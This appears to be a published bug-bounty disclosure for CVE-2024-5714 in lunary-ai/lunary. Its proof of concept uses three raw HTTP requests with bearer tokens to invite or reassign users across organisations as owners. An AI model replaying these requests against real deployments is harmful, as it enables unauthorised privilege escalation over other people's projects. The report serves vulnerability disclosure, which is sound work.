@@ -1,0 +1,123 @@
+Title: A member can invite/change other users to someone else's project / can change other org's users to own/non-own projects in lunary-ai/lunary
+
+Proof of Concept: 
+A)INVITE USERS TO OTHER ORG'S PROJECTS
+
+Log in as a owner in http://localhost:8080. In this test, a free plan user is being used as I do not have a paid plan. This member is ilebarrionuevo+555@gmail.comorgId: f2e845c9-3b01-4d7d-99bb-b9a985bc8f64`
+Copy the Authorization token.
+Send the following request to send an invitation to any person to the project of another org (ilebarrionuevo@gmail.com owner), by manipulating the project id with the one corresponding to the other user's org. Include the Authorization token from step 2:
+ilebarrionuevo@gmail.com project id: 60c090f3-668a-4e9c-b330-24a44dd1f4f7 - orgId: 72cd3972-d8d5-4409-89fd-345fecaa8bae
+
+POST /v1/users HTTP/1.1
+Host: localhost:3333
+Content-Length: 107
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIzMWNkM2U0Yy1hYTMyLTRhMTAtYjA0Mi01MTNlZmUyN2E0NDUiLCJlbWFpbCI6ImlsZWJhcnJpb251ZXZvKzY2NjdAZ21haWwuY29tIiwib3JnSWQiOiJmMmU4NDVjOS0zYjAxLTRkN2QtOTliYi1iOWE5ODViYzhmNjQiLCJleHAiOjE3MTUxMDU2MjIsImlhdCI6MTcxMjUxMzYyMiwibmJmIjoxNzEyNTEzNjIyfQ.4IdnMyhU5SJ2c-MX8sxb5ifMhRoGsrB8mTWFQ--FJnE
+sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
+sec-ch-ua-platform: "macOS"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+{"email":"ilebarrionuevo+686@gmail.com","role":"owner","projects":["60c090f3-668a-4e9c-b330-24a44dd1f4f7"]}
+
+The response shows the user has been invited successfully: Invite user to another org's project
+When the invited user accepts the invitation and logs in, the project list is broken and there is no visible project associated (and the org where the user is logged in is not the same as the project that has been joined): User in same org but other org's project
+See the orgId and projectId in the following request GET /v1/users/me/org: Inconsistency between OrgId and ProjectId
+
+B)CHANGE OWN MEMBERS TO OTHER ORG'S PROJECTS AND ESCALATING PRIVILEGE
+
+Log in as a owner in http://localhost:8080. In this test, a free plan user is being used as I do not have a paid plan. This member is ilebarrionuevo+555@gmail.comorgId: f2e845c9-3b01-4d7d-99bb-b9a985bc8f64`
+Copy the Authorization token.
+Send the following request to change a member of THIS org to another project from ANOTHER org not owned by this authenticated user:
+Member to be changed: ilebarrionuevo+6667@gmail.com - id: 31cd3e4c-aa32-4a10-b042-513efe27a445
+Destination project from other org: projectId: b8a963d7-0eff-4e39-86cd-89fd19b376fd
+Also, define the role as Admin / Owner to give this user full permissions in that project:
+
+PATCH /v1/users/31cd3e4c-aa32-4a10-b042-513efe27a445 HTTP/1.1
+Host: localhost:3333
+Content-Length: 68
+sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJkODE0NTY5MS00YzM3LTQ5MmItODhmNC1lOGIyMWQxMzM4YzgiLCJlbWFpbCI6ImlsZWJhcnJpb251ZXZvKzU1NUBnbWFpbC5jb20iLCJvcmdJZCI6ImYyZTg0NWM5LTNiMDEtNGQ3ZC05OWJiLWI5YTk4NWJjOGY2NCIsImV4cCI6MTcxNTEwOTcyNCwiaWF0IjoxNzEyNTE3NzI0LCJuYmYiOjE3MTI1MTc3MjR9.IwhFE4bcsPj65Fwm9g4RfZqBlacVnINfu-UWnnZiUFk
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+sec-ch-ua-platform: "macOS"
+Accept: */*
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en;q=0.9
+Connection: close
+
+{"role":"owner","projects":["b8a963d7-0eff-4e39-86cd-89fd19b376fd"]}
+
+Note the changes have been applied: User changed to another org's project
+If this changed user logs in, will see no project names associated to the account. Note this user is an owner: Empty project names
+And the request GET /v1/users/me/org shows the user is associated to the project belonging to another org: Request - other org's project
+
+C)CHANGE OTHER ORG'S MEMBERS TO OWN/OTHER'S PROJECTS
+
+Log in as an owner in http://localhost:8080. In this test, a free plan user is being used as I do not have a paid plan. This member is ilebarrionuevo+555@gmail.comorgId: f2e845c9-3b01-4d7d-99bb-b9a985bc8f64`
+Copy the Authorization token.
+Send the following request to change a member of ANOTHER org to another project from ANOTHER org (or OWNED org from authenticated user). In this case, we'll change a user to our own org's project:
+Member to be changed: ilebarrionuevo+11@gmail.com - id: 48a5300e-8ecc-4556-8d21-8780172727b7
+Destination project from owned org: projectId: f32fc9b1-0f05-4f4a-8a98-9b2bbdab0221
+
+PATCH /v1/users/48a5300e-8ecc-4556-8d21-8780172727b7 HTTP/1.1
+Host: localhost:3333
+Content-Length: 68
+sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJkODE0NTY5MS00YzM3LTQ5MmItODhmNC1lOGIyMWQxMzM4YzgiLCJlbWFpbCI6ImlsZWJhcnJpb251ZXZvKzU1NUBnbWFpbC5jb20iLCJvcmdJZCI6ImYyZTg0NWM5LTNiMDEtNGQ3ZC05OWJiLWI5YTk4NWJjOGY2NCIsImV4cCI6MTcxNTExMTMzOSwiaWF0IjoxNzEyNTE5MzM5LCJuYmYiOjE3MTI1MTkzMzl9.geR_w9i0WuAC6pEIvQOWdIMHHSIIYm2zLnSYsADCU2o
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+sec-ch-ua-platform: "macOS"
+Accept: */*
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en;q=0.9
+Connection: close
+
+{"role":"owner","projects":["f32fc9b1-0f05-4f4a-8a98-9b2bbdab0221"]}
+
+Note the changes have been applied: User from another org changed to own project
+If this changed user logs in, will see no project names associated to the account. Note this user is an owner in the other org (we made him to escalate privileges there); he has not been added to our org but to our project: Empty project names
+And the request GET /v1/users/me/org shows the user is associated to the project of OUR org, but the org id is still the OTHER one: Request - own org's project
+
+Impact: 
+It is possible to associate people to other projects the user does not own in his org, and change users from other orgs to different projects, causing inconsistences in the platform to these users and the org. In these manipulations, it is possible to assign roles with high privileges to those users, allowing them privilege escalation.
+
+CVE ID: CVE-2024-5714
+Status: (published)
+Vulnerability Type: CWE-284: Improper Access Control
+Severity: High (7.4)
+Attack Vector: Network
+Attack Complexity: High
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: High
+Availability: None
+Registry: Npm
+Affected Version: 1.2.4
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $540
+Fix Bounty: $112.5
